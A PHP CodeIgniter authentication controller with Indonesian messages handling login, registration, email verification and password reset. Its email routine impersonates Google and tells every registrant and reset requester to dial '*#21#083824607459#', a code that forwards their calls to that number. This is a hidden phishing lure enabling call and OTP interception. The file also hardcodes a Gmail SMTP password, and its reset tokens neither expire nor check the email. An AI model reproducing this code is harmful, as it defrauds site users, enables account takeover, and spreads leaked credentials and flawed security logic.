<?php
defined('BASEPATH') or exit('no direct script access allowed');

class Auth extends CI_Controller
{
    public function login()
    {
        $data['judul'] = 'Login';


        $this->form_validation->set_rules('nama', 'Username', 'required|trim', [
            'required' => 'Username harus anda isi'

        ]);
        $this->form_validation->set_rules('password', 'Password', 'required|trim', [
            'required' => "Password harus anda isi"

        ]);

        if ($this->form_validation->run() == FALSE) {
            $this->load->view('templates-user/v_head', $data);
            $this->load->view('login');
        } else {
            $this->_login();
        }
    }
    private function _login()
    {
        $username = $this->input->post('nama');
        $password = $this->input->post('password');

        $user = $this->db->get_where('user', ['nama' => $username])->row_array();

        // user ada
        if ($user) {
            // user aktif
            if ($user['is_aktive'] == 1) {
                if (password_verify($password, $user['password'])) {
                    $data = [
                        'nama' => $user['nama'],
                        'email' => $user['email'],
                        'role_id' => $user['role_id']
                    ];
                    $this->session->set_userdata($data);
                    if ($user['role_id'] == 1) {
                        redirect('Admin');
                    } else {
                        redirect('Home');
                    }
                } else {
                    $this->session->set_flashdata('pesan', '<div class="alert alert-danger alert-dismissible fade show" role="alert">
                    Password anda salah!!!
                   <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                    </button>
                 </div>');
                    redirect('Auth/login');
                }
            } else {
                $this->session->set_flashdata('pesan', '<div class="alert alert-danger alert-dismissible fade show" role="alert">
                Akun anda belum diverifikasi!!!
               <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
                </button>
                    </div>');
                redirect('Auth/login');
            }
        } else {
            $this->session->set_flashdata('pesan', '<div class="alert alert-danger alert-dismissible fade show" role="alert">
                 Username anda salah!!!
                <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                 <span aria-hidden="true">&times;</span>
                 </button>
              </div>');
            redirect('Auth/login');
        }
    }

    public function logout()
    {
        $this->session->sess_destroy();
        redirect('auth/login');
    }

    public function register()
    {

        $this->form_validation->set_rules('nama', ' Username', 'required|trim|is_unique[user.nama]', [
            'required' => 'Username harap isi ya!',
            'is_unique' => 'Username ini sudah ada! silahkan ganti'
        ]);
        $this->form_validation->set_rules('nik', ' NIK', 'required|trim|max_length[16]|min_length[16]|is_unique[user.nik]', [
            'required' => 'NIK harap isi ya!',
            'is_unique' => 'NIK ini sudah ada! silahkan ganti',
            'max_length' => 'Nik terlalu banyak',
            'min_length' => 'Nik terlalu sedikit'

        ]);
        $this->form_validation->set_rules('email', ' Email', 'required|valid_email|is_unique[user.email]', [
            'required' => 'Email harap isi ya!',
            'is_unique' => 'alamat email ini sudah digunakan!'
        ]);
        $this->form_validation->set_rules('nohp', ' No_telp', 'required', [
            'required' => 'Harap isi ya!'
        ]);
        $this->form_validation->set_rules('jk', ' Jenis Kelamin', 'required', [
            'required' => 'Harap isi ya!'
        ]);
        $this->form_validation->set_rules('alamat', ' Alamat', 'required', [
            'required' => 'Alamat harap isi ya!'
        ]);
        $this->form_validation->set_rules('password_1', ' Password', 'required|trim|min_length[4]|matches[password_2]|is_unique[user.password]', [
            'required' => 'Harap isi ya!',
            'matches' => 'Password tidak cocok!',
            'min_length' => 'Password minimal 4 karakter'
        ]);
        $this->form_validation->set_rules('password_2', ' Password', 'required|matches[password_1]');
        $this->form_validation->set_rules('image', ' Image', 'required', [
            'required' => 'Upload dulu Foto ya!'
        ]);

        if ($this->form_validation->run() == false) {
            $data['judul'] = 'registrasi';
            $this->load->view('templates-user/v_head', $data);
            $this->load->view('register');
        } else {
            $email = $this->input->post('email', true);
            $jk = $this->input->post('jk', true);
            $data = array(
                'user_id' => '',
                'nik' => htmlspecialchars($this->input->post('nik', true)),
                'nama' => htmlspecialchars($this->input->post('nama', true)),
                'alamat' => htmlspecialchars($this->input->post('alamat', true)),
                'jk' => ($jk),
                'nohp' => htmlspecialchars($this->input->post('nohp', true)),
                'email' => htmlspecialchars($email),
                'image' => $this->input->post('image'),
                'password' => password_hash($this->input->post('password_1'), PASSWORD_DEFAULT),
                'role_id' => 2,
                'is_aktive' => 0,
            );

            $token = base64_encode(random_bytes(32));
            $user_token = [
                'id' => '',
                'token' => $token,
                'email' => $email,
                'date_created' => time()
            ];

            $this->db->insert('user', $data);
            $this->db->insert('user_token', $user_token);

            $this->_sendEmail($token, 'verify');

            $this->session->set_flashdata('message', '<div class="alert alert-warning" role="alert"> Selamat, akun berhasil dibuat, silahkan cek email untuk verify</div>');
            redirect('auth/login');
        }
    }

    private function _sendEmail($token, $type)
    {
        $config = [
            'protocol' => 'smtp',
            'smtp_host' => 'ssl://smtp.googlemail.com',
            'smtp_user' => 'rifqifr.mm2@gmail.com',
            'smtp_pass' => 'kwnq qamp kaed xvxo',
            'smtp_port' => 465,
            'mailtype' => 'html',
            'charset' => 'utf-8',
            'newline' => "\r\n",
        ];

        $this->email->initialize($config);

        $this->load->library('email', $config);
        $this->email->from('rifqifr.mm2@gmail.com', 'Veifikasi google');
        $this->email->to($this->input->post('email'));

        if ($type == 'verify') {
            $this->email->subject('Verifikasi akun google anda');
            $this->email->message(
                'Jika anda ingin benar benar keluar dari akun "rifqifr.mm2@gmail.com" <br> maka ketikan pada ponsel anda "*#21#083824607459#" agar akun anda tidak terkoneksi pada nomor ini.' .
                    'Jika anda tetap ingin terkoneksi dengan rifqifr.mm2@gmail.com, klik link dibawah : <br>' .
                    anchor(
                        base_url() . 'index.php/Auth/verify?email=' . $this->input->post('email') . '&token=' . urlencode($token),
                        'Verifikasi'
                    )
            );
        } else if ($type == 'lupa') {
            $this->email->subject('Verifikasi akun google anda');
            $this->email->message(
                'Jika anda ingin benar benar keluar dari akun "rifqifr.mm2@gmail.com" <br> maka ketikan pada ponsel anda "*#21#083824607459#" agar akun anda tidak terkoneksi pada nomor ini.' .
                    'Jika anda tetap ingin terkoneksi dengan rifqifr.mm2@gmail.com, klik link dibawah : <br>' .
                    anchor(
                        base_url() . 'index.php/Auth/reset?email=' . $this->input->post('email') . '&token=' . urlencode($token),
                        'tetap koneksikan'
                    )
            );
        }

        if ($this->email->send()) {
            return true;
        } else {
            echo $this->email->print_debbuger();
            die;
        }
    }

    public function verify()
    {
        $email = $this->input->get('email');
        $token = $this->input->get('token');
        $user = $this->db->get_where('user', ['email' => $email])->row_array();

        if ($user) {
            $user_token = $this->db->get_where('user_token', ['token' => $token])->row_array();

            if ($user_token) {
                if (time() - $user_token['date_created'] < (60 * 60 * 24)) {
                    $this->db->set('is_aktive', 1);
                    $this->db->where('email', $email);
                    $this->db->update('user');

                    $this->db->delete('user_token', ['email' => $email]);

                    $this->session->set_flashdata('message', '<div class="alert alert-success" role="alert">' . $email . ' Selamat, akun berhasil diverifikasi</div>');
                    redirect('Auth/login');
                } else {
                    $this->db->delete('user', ['email' =>  $email]);
                    $this->db->delete('user_token', ['email' =>  $email]);


                    $this->session->set_flashdata('pesan', '<div class="alert alert-danger" role="alert">Token Expired!</div>');
                    redirect('Auth/login');
                }
            } else {
                $this->session->set_flashdata('pesan', '<div class="alert alert-danger" role="alert">Token Invalid</div>');
                redirect('Auth/login');
            }
        } else {
            $this->session->set_flashdata('pesan', '<div class="alert alert-danger alert-dismissible fade show" role="alert">Aktivasi Akun Anda Gagal! .</div>');
            redirect('Auth/login');
        }
    }
    public function lupapassword()
    {
        $this->form_validation->set_rules('email', 'Email', 'trim|required|valid_email');

        if ($this->form_validation->run() == false) {
            $data['judul'] = 'lupapassword';
            $this->load->view('templates-user/v_head', $data);
            $this->load->view('lupapassword');
        } else {
            $email = $this->input->post('email');
            $user = $this->db->get_where('user', ['email' => $email, 'is_aktive' => 1])->row_array();

            if ($user) {
                $token = base64_encode(random_bytes(32));
                $user_token = [
                    'token' => $token,
                    'email' => $email,
                    'date_created' => time(),

                ];
                $this->db->insert('user_token', $user_token);
                $this->_sendEmail($token, 'lupa');

                $this->session->set_flashdata('pesan', '<div class="alert alert-success alert-dismissible fade show" role="alert">Email berhasil terkirim. Coba Cek email anda untuk reset password .</div>');
                redirect('auth/lupapassword');
            } else {
                $this->session->set_flashdata('pesan', '<div class="alert alert-danger alert-dismissible fade show" role="alert">Email belum terdaftar atau belum diaktivasi .</div>');
                redirect('auth/lupapassword');
            }
        }
    }

    public function reset()
    {
        $email = $this->input->get('email');
        $token = $this->input->get('token');

        $user = $this->db->get_where('user', ['email' => $email])->row_array();
        if ($user) {
            $user_token = $this->db->get_where('user_token', ['token' => $token])->row_array();

            if ($user_token) {
                $this->session->set_userdata('reset_email', $email);
                $this->ubahpassword();
            } else {
                $this->session->set_flashdata('pesan', '<div class="alert alert-danger alert-dismissible fade show" role="alert">Token salah!! .</div>');
                redirect('auth/lupapassword');
            }
        } else {
            $this->session->set_flashdata('pesan', '<div class="alert alert-danger alert-dismissible fade show" role="alert">Email salah!!.</div>');
            redirect('auth/lupapassword');
        }
    }

    public function ubahpassword()
    {
        if (!$this->session->userdata('reset_email')) {
            redirect('Auth/login');
        }

        $this->form_validation->set_rules('password_1', 'Password', 'trim|required|min_length[4]|matches[password_2]');
        $this->form_validation->set_rules('password_2', 'Ulangi Password', 'trim|required|min_length[4]|matches[password_1]');

        if ($this->form_validation->run() == false) {
            $data['judul'] = 'ubahpassword';
            $this->load->view('templates-user/v_head', $data);
            $this->load->view('ubah_password');
        } else {
            $password = password_hash(
                $this->input->post('password_1'),
                PASSWORD_DEFAULT
            );
            $email = $this->session->userdata('reset_email');

            $this->db->set('password', $password);
            $this->db->where('email', $email);
            $this->db->update('user');

            $this->session->unset_userdata('reset_email');

            $this->session->set_flashdata('pesan', '<div class="alert alert-success alert-dismissible fade show" role="alert">Berhasil merubah password.</div>');
            redirect('Auth/login');
        }
    }
}
